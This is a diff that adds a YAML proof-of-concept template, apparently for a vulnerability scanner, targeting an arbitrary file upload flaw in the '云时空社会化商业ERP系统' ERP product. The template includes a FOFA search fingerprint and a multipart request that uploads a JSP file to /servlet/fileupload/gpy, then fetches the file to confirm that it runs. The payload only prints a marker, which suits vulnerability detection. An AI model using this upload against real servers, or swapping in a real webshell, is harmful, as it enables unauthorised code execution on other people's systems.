@@ -1,0 +1,33 @@
+id: poc-yaml-yun-shi-kong-erp-system-gpy-anyfile-upload
+info:
+  name: 云时空社会化商业ERP系统 gpy 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 云时空社会化商业ERP系统
+  fofa: app="云时空社会化商业ERP系统"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /servlet/fileupload/gpy
+  headers:
+    Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
+  data: '--4eea98d02AEa93f60ea08dE3C18A1388
+
+    Content-Disposition: form-data; name="file1"; filename="{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <% out.println("{{.t2}}"); %>
+
+    --4eea98d02AEa93f60ea08dE3C18A1388--'
+  expression: status_code == 200 && matches(body,"(?P<t3>(\\d{4}-\\d{2}-\\d{2}))")
+  output:
+  - regex_match(body,"(?P<t3>(\\d{4}-\\d{2}-\\d{2}))")
+- method: GET
+  path: /uploads/pics/{{.t3}}/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
